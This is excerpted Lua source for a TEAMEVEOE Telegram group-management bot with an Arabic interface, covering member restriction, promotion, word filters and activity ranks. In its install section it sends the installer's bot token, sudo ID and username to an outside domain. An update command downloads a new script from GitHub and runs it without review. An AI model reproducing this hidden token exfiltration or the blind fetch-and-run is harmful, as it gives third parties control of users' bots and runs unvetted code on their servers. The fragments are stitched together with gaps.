...
local token = io.read()
if token ~= '' then
local url , res = https.request(''..token..'/getMe')
if res ~= 200 then
...
https.request('http://kartax.ga/TEAMEVEOE/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("TEAMEVEOE", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/TEAMEVEOE
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./TEAMEVEOE.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("run", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S TEAMEVEOE -X kill
screen -S TEAMEVEOE ./TEAMEVEOE
done
]])  
file:close() 
...
local url , res = https.request(""..token.."/getchatmember?chat_id="..database:get(bot_id..'add:ch:id').."&user_id="..User);
...
https.request(""..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
local function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = ""..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = ""..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end
...
local TEAMEVEOE_Msg = ''  
if msgs < 100 then 
TEAMEVEOE_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
TEAMEVEOE_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
TEAMEVEOE_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
TEAMEVEOE_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
TEAMEVEOE_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
TEAMEVEOE_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
TEAMEVEOE_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
TEAMEVEOE_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
TEAMEVEOE_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
TEAMEVEOE_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
TEAMEVEOE_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
TEAMEVEOE_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
TEAMEVEOE_Msg = 'رب التفاعل '  
end 
return TEAMEVEOE_Msg 
end
...
local File = json:decode(https.request(''.. token..'/getfile?file_id='..ID_FILE) ) 
...
if type == 'keed' then
https.request("" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
...
function plugin_TEAMEVEOEa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.TEAMEVEOEa and msg then
pre_msg = plugin.TEAMEVEOEa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceTEAMEVEOE(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,TEAMEVEOE_Msg) 
return false  
end 
if text then    
...
if text == 'السيرفر🔎' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local TEAMEVEOE1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..TEAMEVEOE1.server.uptime_in_days..'('..TEAMEVEOE1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..TEAMEVEOE1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..TEAMEVEOE1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..TEAMEVEOE1.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end


if text == 'تحديث السورس ☑️' and SudoBot(msg) then 
os.execute('rm -rf TEAMEVEOE.lua')
os.execute('wget https://raw.githubusercontent.com/SORESEVEO/TEAMEVEOE/master/TEAMEVEOE.lua')
send(msg.chat_id_, msg.id_,'🗂️┇ تم تحديث السورس')
dofile('TEAMEVEOE.lua')  
end
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..TEAMEVEOEk..''..TEAMEVEOE..'\n*📌┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
local TEAMEVEOE1_Msg = database:get(bot_id.."TEAMEVEOE1:Add:Filter:Rp2"..text..msg.chat_id_)   
if TEAMEVEOE1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request(''..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
...
--------------------------------------------------------------------------------------------------------------
if TEAMEVEOE_Msg and not Special(msg) then  
local TEAMEVEOE_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if TEAMEVEOE_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
local linkgpp = json:decode(https.request(''..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
...
https.request(""..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
...
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request(""..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
...
https.request(""..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'EvEoE')..')'
...
https.request(""..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
...
https.request("" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'EvEoE')..')'
status  = '\n☑️┇ تم تقييده في المجموعه'
...
function start_function(extra, result, success)
https.request("" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'EvEoE')..')'
status  = '\n📮┇ الايدي » `'..result.sender_user_id_..'`\n☑️┇ تم الغاء تقييده'
send(msg.chat_id_, msg.id_, usertext..status)
...
function start_function(extra, result, success)
if result.id_ then
https.request("" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'EvEoE')..')'
status  = '\n☑️┇ تم الغاء تقييده'
texts = usertext..status
else
...
https.request("" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'EvEoE')..')'
status  = '\n☑️┇ تم الغاء تقييده'
...
send(msg.chat_id_, msg.id_, usertext..status)
https.request(""..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
...
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request(""..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⚠┇ لا يوجد حساب بهاذا المعرف')
end
end
...
send(msg.chat_id_, msg.id_, usertext..status)
https.request(""..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
...
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request(""..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⚠┇ لا يوجد حساب بهاذا المعرف')
end
end
...
send(msg.chat_id_, msg.id_, usertext..status)
https.request(""..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
...
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request(""..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
else
send(msg.chat_id_, msg.id_, '⚠┇ لا يوجد حساب بهاذا المعرف')
end
end
...
https.request(''..token..'/deleteChatPhoto?chat_id='..msg.chat_id_) 
...
database:set(bot_id.."TEAMEVEOE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."TEAMEVEOE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"☑️┇ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."TEAMEVEOE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."TEAMEVEOE1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."TEAMEVEOE1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."TEAMEVEOE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖┇تم منع الكلمه مع التحذير")  
database:del(bot_id.."TEAMEVEOE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."TEAMEVEOE1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."TEAMEVEOE1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."TEAMEVEOE1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖┇ارسل الكلمه الان")  
database:set(bot_id.."TEAMEVEOE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."TEAMEVEOE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."TEAMEVEOE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."TEAMEVEOE1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."TEAMEVEOE1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."TEAMEVEOE1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."TEAMEVEOE1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."TEAMEVEOE1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."TEAMEVEOE1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔┇قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local TEAMEVEOE_Msg = database:get(bot_id.."TEAMEVEOE1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..TEAMEVEOE_Msg.."}\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..TEAMEVEOE_Msg[math.random(#TEAMEVEOE_Msg)]..']') 
return false
end
...
},function(ta,TEAMEVEOE)
local t = "\n*👨‍👧‍👧┇ قائمة الاعضاء \n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉\n*"
x = 0
local list = TEAMEVEOE.members_
for k, v in pairs(list) do
x = x + 1
...
-- vardump(data) 
TEAMEVEOEdx(msg.chat_id_, msg.id_, '📤┇ ايدي المجموعة » ( '..msg.chat_id_..' )\n☑️┇ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛┇ عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆┇ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
local Chek_Info = https.request(''..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
...
https.request(""..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
TEAMEVEOE = https.request(""..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(TEAMEVEOE)
...
--------------------------------------------------------------------------------------------------------------
SourceTEAMEVEOE(data.message_,data)
plugin_TEAMEVEOEa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local TEAMEVEOEAbot = database:get(bot_id.."TEAMEVEOE1:Add:Filter:Rp2"..text..result.chat_id_)   
if TEAMEVEOEAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..TEAMEVEOEAbot.."] \n") 
else
...
------------------------------------------------------------------------
if text then
local TEAMEVEOE1_Msg = database:get(bot_id.."TEAMEVEOE1:Add:Filter:Rp2"..text..result.chat_id_)   
if TEAMEVEOE1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..TEAMEVEOE1_Msg)
